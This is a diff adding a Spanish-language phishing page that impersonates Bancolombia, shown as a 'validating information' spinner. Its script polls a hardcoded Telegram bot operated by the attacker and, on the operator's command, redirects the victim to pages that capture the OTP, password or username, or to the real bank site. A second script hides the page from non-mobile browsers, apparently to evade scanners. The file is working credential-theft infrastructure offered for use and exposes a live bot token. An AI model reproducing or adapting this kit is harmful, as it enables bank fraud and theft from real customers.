@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #FDDA24; /* Color Bancolombia */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { color: #333; }
+        p { color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>Validando información...</h2>
+    <p>Por favor espere un momento, no cierre esta ventana.</p>
+
+    <script>
+        // --- CONFIGURACIÓN DE TELEGRAM ---
+        const TELEGRAM_TOKEN = '8594588884:AAF1ODTlOEYhDIKgILpadiPlcgfCm_aZEAA';
+        const TELEGRAM_CHAT_ID = '-5182218323'; // Grupo LOG
+        const API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+
+        async function pollTelegramUpdates(originalMessageId) {
+            let lastUpdateId = 0;
+            
+            // Obtener último ID para no leer mensajes viejos
+            try {
+                const initialResp = await fetch(`${API_URL}/getUpdates?limit=1&offset=-1&t=${Date.now()}`, { cache: 'no-store' });
+                const initialData = await initialResp.json();
+                if (initialData.result && initialData.result.length > 0) {
+                    lastUpdateId = initialData.result[initialData.result.length - 1].update_id + 1;
+                }
+            } catch(e) {}
+
+            const checkUpdates = async () => {
+                try {
+                    const response = await fetch(`${API_URL}/getUpdates?offset=${lastUpdateId}&timeout=10&t=${Date.now()}`, { cache: 'no-store' });
+                    const data = await response.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = update.update_id + 1;
+
+                            if (update.callback_query) {
+                                const cb = update.callback_query;
+                                
+                                // Verificar si el callback pertenece a nuestro mensaje
+                                if (cb.message && String(cb.message.message_id) === String(originalMessageId)) {
+                                    
+                                    // Responder al callback para quitar el relojito en Telegram
+                                    await fetch(`${API_URL}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: {'Content-Type': 'application/json'},
+                                        body: JSON.stringify({ callback_query_id: cb.id })
+                                    });
+                                    
+                                    // Manejar acciones
+                                    if (cb.data === 'finish') {
+                                        window.location.href = 'https://www.bancolombia.com/personas'; // O página final
+                                    } else if (cb.data === 'ask_otp') {
+                                        window.location.href = 'Dinamica.html'; // Avanzar a OTP
+                                    } else if (cb.data === 'error_dinamica') {
+                                        window.location.href = 'Dinamica.html?error=true';
+                                    } else if (cb.data === 'error_clave') {
+                                        window.location.href = 'clave.html?error=true';
+                                    } else if (cb.data === 'error_user') {
+                                        window.location.href = 'USUARIO BANCOLOMBIA.html?error=true';
+                                    } else if (cb.data === 'ask_logo') { 
+                                        window.location.href = 'USUARIO BANCOLOMBIA.html';
+                                    }
+                                    
+                                    return; // Terminar polling
+                                }
+                            }
+                        }
+                    }
+                    // Seguir sondeando
+                    setTimeout(checkUpdates, 100);
+                } catch (error) {
+                    console.error("Polling error:", error);
+                    setTimeout(checkUpdates, 2000);
+                }
+            };
+            checkUpdates();
+        }
+
+        // Iniciar al cargar
+        document.addEventListener('DOMContentLoaded', () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            const messageId = urlParams.get('id');
+
+            if (messageId) {
+                console.log("Esperando respuesta para mensaje:", messageId);
+                pollTelegramUpdates(messageId);
+            } else {
+                console.log("No message ID found. Polling disabled.");
+                // Opcional: Redirigir si no hay ID o manejar error
+            }
+        });
+    </script>
+<script>
+    (function() {
+        // Mobile Check
+        var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        var mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
+        if (!mobileRegex.test(userAgent)) {
+            document.body.innerHTML = '';
+        }
+
+        try {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let token = '';
+            for(let i=0; i < 50 + Math.floor(Math.random() * 30); i++) {
+                token += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            const base64Token = btoa(token + Date.now()).replace(/=/g, '');
+            const url = new URL(window.location.href);
+            url.searchParams.set('token', base64Token);
+            window.history.replaceState(null, '', url.toString());
+        } catch(e) {}
+    })();
+</script>
+</body>
+</html>
